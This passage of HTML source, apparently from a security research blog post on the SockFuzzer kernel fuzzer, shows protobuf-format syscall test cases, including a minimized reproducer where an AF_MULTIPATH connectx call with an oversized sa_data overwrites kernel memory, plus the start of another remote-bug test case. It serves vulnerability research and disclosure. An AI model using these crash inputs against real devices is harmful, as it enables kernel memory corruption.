&lt;/span&gt;&lt;span class="c1"&gt;{&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; sa_family&lt;/span&gt;&lt;span class="c1"&gt;:&lt;/span&gt;&lt;span class="c0 c2"&gt;&amp;nbsp;AF_MULTIPATH&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; sa_data&lt;/span&gt;&lt;span class="c1"&gt;:&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c19"&gt;&amp;quot;&amp;quot;&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c1"&gt;}&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c1"&gt;}&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c1"&gt;}&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; associd&lt;/span&gt;&lt;span class="c1"&gt;:&lt;/span&gt;&lt;span class="c0 c2"&gt;&amp;nbsp;ASSOCID_CASE_0&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; flags&lt;/span&gt;&lt;span class="c1"&gt;:&lt;/span&gt;&lt;span class="c0 c2"&gt;&amp;nbsp;CONNECT_DATA_IDEMPOTENT&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &lt;/span&gt;&lt;span class="c1"&gt;}&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c1"&gt;}&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;commands &lt;/span&gt;&lt;span class="c1"&gt;{&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; connectx &lt;/span&gt;&lt;span class="c1"&gt;{&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; socket&lt;/span&gt;&lt;span class="c1"&gt;:&lt;/span&gt;&lt;span class="c0 c2"&gt;&amp;nbsp;FD_0&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; endpoints &lt;/span&gt;&lt;span class="c1"&gt;{&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; sae_srcif&lt;/span&gt;&lt;span class="c1"&gt;:&lt;/span&gt;&lt;span class="c0 c2"&gt;&amp;nbsp;IFIDX_CASE_0&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; sae_srcaddr &lt;/span&gt;&lt;span class="c1"&gt;{&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; sockaddr_generic &lt;/span&gt;&lt;span class="c1"&gt;{&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; sa_family&lt;/span&gt;&lt;span class="c1"&gt;:&lt;/span&gt;&lt;span class="c0 c2"&gt;&amp;nbsp;AF_MULTIPATH&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; sa_data&lt;/span&gt;&lt;span class="c1"&gt;:&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c19"&gt;&amp;quot;&amp;quot;&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c1"&gt;}&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c1"&gt;}&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; sae_dstaddr &lt;/span&gt;&lt;span class="c1"&gt;{&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; sockaddr_generic &lt;/span&gt;&lt;span class="c1"&gt;{&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; sa_family&lt;/span&gt;&lt;span class="c1"&gt;:&lt;/span&gt;&lt;span class="c0 c2"&gt;&amp;nbsp;AF_MULTIPATH&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; sa_data&lt;/span&gt;&lt;span class="c1"&gt;:&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c19"&gt;&amp;quotamp;quot;&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c1"&gt;}&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c1"&gt;}&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c1"&gt;}&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; associd&lt;/span&gt;&lt;span class="c1"&gt;:&lt;/span&gt;&lt;span class="c0 c2"&gt;&amp;nbsp;ASSOCID_CASE_0&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; flags&lt;/span&gt;&lt;span class="c1"&gt;:&lt;/span&gt;&lt;span class="c0 c2"&gt;&amp;nbsp;CONNECT_DATA_IDEMPOTENT&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; flags&lt;/span&gt;&lt;span class="c1"&gt;:&lt;/span&gt;&lt;span class="c0 c2"&gt;&amp;nbsp;CONNECT_DATA_IDEMPOTENT&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; flags&lt;/span&gt;&lt;span class="c1"&gt;:&lt;/span&gt;&lt;span class="c0 c2"&gt;&amp;nbsp;CONNECT_DATA_AUTHENTICATED&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &lt;/span&gt;&lt;span class="c1"&gt;}&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c1"&gt;}&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;commands &lt;/span&gt;&lt;span class="c1"&gt;{&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; connectx &lt;/span&gt;&lt;span class="c1"&gt;{&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; socket&lt;/span&gt;&lt;span class="c1"&gt;:&lt;/span&gt;&lt;span class="c0 c2"&gt;&amp;nbsp;FD_0&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; endpoints &lt;/span&gt;&lt;span class="c1"&gt;{&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; sae_srcif&lt;/span&gt;&lt;span class="c1"&gt;:&lt;/span&gt;&lt;span class="c0 c2"&gt;&amp;nbsp;IFIDX_CASE_0&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; sae_dstaddr &lt;/span&gt;&lt;span class="c1"&gt;{&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; sockaddr_generic &lt;/span&gt;&lt;span class="c1"&gt;{&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; sa_family&lt;/span&gt;&lt;span class="c1"&gt;:&lt;/span&gt;&lt;span class="c0 c2"&gt;&amp;nbsp;AF_MULTIPATH&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; sa_data&lt;/span&gt;&lt;span class="c1"&gt;:&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c19"&gt;&amp;quot;&amp;quot;&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c1"&gt;}&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c1"&gt;}&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c1"&gt;}&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; associd&lt;/span&gt;&lt;span class="c1"&gt;:&lt;/span&gt;&lt;span class="c0 c2"&gt;&amp;nbsp;ASSOCID_CASE_0&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; flags&lt;/span&gt;&lt;span class="c1"&gt;:&lt;/span&gt;&lt;span class="c0 c2"&gt;&amp;nbsp;CONNECT_DATA_IDEMPOTENT&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &lt;/span&gt;&lt;span class="c1"&gt;}&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c1"&gt;}&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;commands &lt;/span&gt;&lt;span class="c1"&gt;{&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; close &lt;/span&gt;&lt;span class="c1"&gt;{&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; fd&lt;/span&gt;&lt;span class="c1"&gt;:&lt;/span&gt;&lt;span class="c0 c2"&gt;&amp;nbsp;FD_8&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &lt;/span&gt;&lt;span class="c1"&gt;}&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c1"&gt;}&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;commands &lt;/span&gt;&lt;span class="c1"&gt;{&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; ioctl_real &lt;/span&gt;&lt;span class="c1"&gt;{&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; siocsifflags &lt;/span&gt;&lt;span class="c1"&gt;{&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; ifr_name&lt;/span&gt;&lt;span class="c1"&gt;:&lt;/span&gt;&lt;span class="c0 c2"&gt;&amp;nbsp;LO0&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; flags&lt;/span&gt;&lt;span class="c1"&gt;:&lt;/span&gt;&lt;span class="c0 c2"&gt;&amp;nbsp;IFF_LINK1&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c1"&gt;}&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &lt;/span&gt;&lt;span class="c1"&gt;}&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c1"&gt;}&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;commands &lt;/span&gt;&lt;span class="c1"&gt;{&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; close &lt;/span&gt;&lt;span class="c1"&gt;{&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; fd&lt;/span&gt;&lt;span class="c1"&gt;:&lt;/span&gt;&lt;span class="c0 c2"&gt;&amp;nbsp;FD_8&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &lt;/span&gt;&lt;span class="c1"&gt;}&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c1"&gt;}&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;data_provider&lt;/span&gt;&lt;span class="c1"&gt;:&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c19"&gt;&amp;quot;\025\025\025\025\025\025\025\025\025\025\025\025\025\025\025\025\025\025\025\025\025\025\025\025\025\025\025\025\025\025\025\025\025\025\025\025\025\025\025\025\025\025\025\025\025\025\025\025\025\025\025\025\025\025\025\025\025\025&amp;quot;&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt; &lt;p class="c4 c15"&gt;&lt;span class="c0 c2"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c11"&gt;&lt;span&gt;Hmm, that&amp;rsquo;s quite large and hard to follow. Is the bug really that complicated? We can use libFuzzer&amp;rsquo;s crash minimization feature to find out. Protobuf-based test cases simplify nicely because even large test cases are already structured, so we can randomly edit and remove nodes from the message. After about a minute of automated minimization, we end up with the test shown below.&lt;/span&gt;&lt;/p&gt;&lt;a id="t.9fd2c563e2b8930f35bbddc2b12b872cadc2745a"&gt;&lt;/a&gt;&lt;a id="t.33"&gt;&lt;/a&gt;&lt;table class="c5"&gt;&lt;tbody&gt;&lt;tr class="c10"&gt;&lt;td class="c16" colspan="1" rowspan="1"&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;commands &lt;/span&gt;&lt;span class="c1"&gt;{&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; socket &lt;/span&gt;&lt;span class="c1"&gt;{&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; domain&lt;/span&gt;&lt;span class="c1"&gt;:&lt;/span&gt;&lt;span class="c0 c2"&gt;&amp;nbsp;AF_MULTIPATH&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; so_type&lt;/span&gt;&lt;span class="c1"&gt;:&lt;/span&gt;&lt;span class="c0 c2"&gt;&amp;nbsp;SOCK_STREAM&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; protocol&lt;/span&gt;&lt;span class="c1"&gt;:&lt;/span&gt;&lt;span class="c0 c2"&gt;&amp;nbsp;IPPROTO_IP&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &lt;/span&gt;&lt;span class="c1"&gt;}&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c1"&gt;}&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;commands &lt;/span&gt;&lt;span class="c1"&gt;{&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; connectx &lt;/span&gt;&lt;span class="c1"&gt;{&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; socket&lt;/span&gt;&lt;span class="c1"&gt;:&lt;/span&gt;&lt;span class="c0 c2"&gt;&amp;nbsp;FD_0&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; endpoints &lt;/span&gt;&lt;span class="c1"&gt;{&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; sae_srcif&lt;/span&gt;&lt;span class="c1"&gt;:&lt;/span&gt;&lt;span class="c0 c2"&gt;&amp;nbsp;IFIDX_CASE_1&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; sae_dstaddr &lt;/span&gt;&lt;span class="c1"&gt;{&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; sockaddr_generic &lt;/span&gt;&lt;span class="c1"&gt;{&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; sa_family&lt;/span&gt;&lt;span class="c1"&gt;:&lt;/span&gt;&lt;span class="c0 c2"&gt;&amp;nbsp;AF_MULTIPATH&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; sa_data&lt;/span&gt;&lt;span class="c1"&gt;:&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c19"&gt;&amp;quot;bugmbuf_debutoeloListen_dedeloListen_dedebuloListete_debugmbuf_debutoeloListen_dedeloListen_dedebuloListeListen_dedebuloListe_dtrte&amp;quot;&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c17"&gt;# string length 131&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c1"&gt;}&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c1"&gt;}&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c1"&gt;}&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; associd&lt;/span&gt;&lt;span class="c1"&gt;:&lt;/span&gt;&lt;span class="c0 c2"&gt;&amp;nbsp;ASSOCID_CASE_0&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &lt;/span&gt;&lt;span class="c1"&gt;}&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c1"&gt;}&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;data_provider&lt;/span&gt;&lt;span class="c1"&gt;:&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c19"&gt;&amp;quot;&amp;quot;&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt; &lt;p class="c11"&gt;&lt;span&gt;&lt;br&gt;This is a lot easier to read! It appears that SockFuzzer managed to open a socket from the &lt;/span&gt;&lt;span class="c9"&gt;AF_MULTIPATH&lt;/span&gt;&lt;span&gt;&amp;nbsp;domain and called &lt;/span&gt;&lt;span class="c9"&gt;connectx&lt;/span&gt;&lt;span&gt;&amp;nbsp;on it with a sockaddr using an unexpected &lt;/span&gt;&lt;span class="c9"&gt;sa_family&lt;/span&gt;&lt;span&gt;, in this case &lt;/span&gt;&lt;span class="c9"&gt;AF_MULTIPATH&lt;/span&gt;&lt;span&gt;. Then the large &lt;/span&gt;&lt;span class="c9"&gt;sa_data&lt;/span&gt;&lt;span class="c8 c2"&gt;&amp;nbsp;field was used to overwrite memory. You can see some artifacts of heuristics used by the fuzzer to guess strings as &amp;ldquo;listen&amp;rdquo; and &amp;ldquo;mbuf&amp;rdquo; appear in the input. This testcase could be further simplified by modifying the sa_data to a repeated character, but I left it as is so you can see exactly what it&amp;rsquo;s like to work with the output of this fuzzer.&lt;/span&gt;&lt;/p&gt; &lt;p class="c11"&gt;&lt;span&gt;In my experience, t&lt;/span&gt;&lt;span class="c8 c2"&gt;he protobuf-formatted syscalls and packet descriptions were highly useful for reproducing crashes and tended to work on the first attempt. I didn&amp;rsquo;t have an excellent setup for debugging on-device, so I tried to lean on the fuzzing framework as much as I could to understand issues before proceeding with the expensive process of reproducing them.&lt;/span&gt;&lt;/p&gt; &lt;p class="c11"&gt;&lt;span&gt;In &lt;/span&gt;&lt;span class="c14"&gt;&lt;a class="c121" href="https://googleprojectzero.blogspot.com/2019/12/sockpuppet-walkthrough-of-kernel.html"&gt;my &lt;/a&gt;&lt;/span&gt;&lt;span class="c14"&gt;&lt;a class="c121" href="https://googleprojectzero.blogspot.com/2019/12/sockpuppet-walkthrough-of-kernel.html"&gt;previous post&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;describing the &amp;ldquo;SockPuppet&amp;rdquo; vulnerability&lt;/span&gt;&lt;span&gt;, I walked through one of the newly discovered vulnerabilities, from protobuf to exploit. I&amp;rsquo;d like to share another original protobuf bug report for a remotely-triggered vulnerability I reported &lt;/span&gt;&lt;span class="c14"&gt;&lt;a class="c121" href="https://bugs.chromium.org/p/project-zero/issues/detail?id=1976"&gt;here&lt;/a&gt;&lt;/span&gt;&lt;span class="c8 c2"&gt;.&lt;/span&gt;&lt;/p&gt;&lt;a id="t.eac5bf4a152226018135f44cd838ea6f45dde5ec"&gt;&lt;/a&gt;&lt;a id="t.34"&gt;&lt;/a&gt;&lt;table class="c5"&gt;&lt;tbody&gt;&lt;tr class="c10"&gt;&lt;td class="c16" colspan="1" rowspan="1"&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;commands &lt;/span&gt;&lt;span class="c1"&gt;{&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; socket &lt;/span&gt;&lt;span class="c1"&gt;{&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; domain&lt;/span&gt;&lt;span class="c1"&gt;:&lt;/span&gt;&lt;span class="c0 c2"&gt;&amp;nbsp;AF_INET6&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; so_type&lt;/span&gt;&lt;span class="c1"&gt;:&lt;/span&gt;&lt;span class="c0 c2"&gt;&amp;nbsp;SOCK_RAW&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; protocol&lt;/span&gt;&lt;span class="c1"&gt;:&lt;/span&gt;&lt;span class="c0 c2"&gt;&amp;nbsp;IPPROTO_IP&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &lt;/span&gt;&lt;span class="c1"&gt;}&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c1"&gt;}&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;commands &lt;/span&gt;&lt;span class="c1"&gt;{&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; set_sock_opt &lt;/span&gt;&lt;span class="c1"&gt;{&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; level&lt;/span&gt;&lt;span class="c1"&gt;:&lt;/span&gt;&lt;span class="c0 c2"&gt;&amp;nbsp;SOL_SOCKET&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; name&lt;/span&gt;&lt;span class="c1"&gt;:&lt;/span&gt;&lt;span class="c0 c2"&gt;&amp;nbsp;SO_RCVBUF&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; val&lt;/span&gt;&lt;span class="c1"&gt;:&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c19"&gt;&amp;quot;\021\000\000\000&amp;quot;&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &lt;/span&gt;&lt;span class="c1"&gt;}&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c1"&gt;}&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;commands &lt;/span&gt;&lt;span class="c1"&gt;{&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; set_sock_opt &lt;/span&gt;&lt;span class="c1"&gt;{&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; level&lt;/span&gt;&lt;span class="c1"&gt;:&lt;/span&gt;&lt;span class="c0 c2"&gt;&amp;nbsp;IPPROTO_IPV6&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; name&lt;/span&gt;&lt;span class="c1"&gt;:&lt;/span&gt;&lt;span class="c0 c2"&gt;&amp;nbsp;IP_FW_ZERO&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; val&lt;/span&gt;&lt;span class="c1"&gt;:&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c19"&gt;&amp;quot;\377\377\377\377&amp;quot;&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &lt;/span&gt;&lt;span class="c1"&gt;}&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c1"&gt;}&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;commands &lt;/span&gt;&lt;span class="c1"&gt;{&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; ip_input &lt;/span&gt;&lt;span class="c1"&gt;{&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; tcp6_packet &lt;/span&gt;&lt;span class="c1"&gt;{&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; ip6_hdr &lt;/span&gt;&lt;span class="c1"&gt;{&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; ip6_hdrctl &lt;/span&gt;&lt;span class="c1"&gt;{&lt;/span&gt;&lt;/p&gt; &lt;p 